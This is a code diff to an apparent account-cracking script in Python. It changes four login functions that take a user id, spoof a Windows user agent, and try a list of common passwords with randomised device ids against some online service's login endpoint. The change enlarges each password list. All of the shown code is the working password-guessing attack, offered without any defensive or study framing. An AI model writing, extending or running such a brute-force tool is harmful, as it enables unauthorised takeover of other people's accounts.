@@ -767,7 +767,7 @@ def login1(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","qwerty","QWERTY","PASSWORD","password","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","qwerty","QWERTY","PASSWORD","1234567","12345678","123456789","111111","112233","111222","57273200","59039200"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -826,7 +826,7 @@ def login2(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","qwerty","QWERTY","PASSWORD","1234567","12345678","123456789","111111","112233","111222","57273200","59039200"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -887,7 +887,7 @@ def login3(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","qwerty","QWERTY","PASSWORD","1234567","12345678","123456789","111111","112233","111222","57273200","59039200"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -948,7 +948,7 @@ def login4(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","qwerty","QWERTY","PASSWORD","1234567","12345678","123456789","111111","112233","111222","57273200","59039200"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
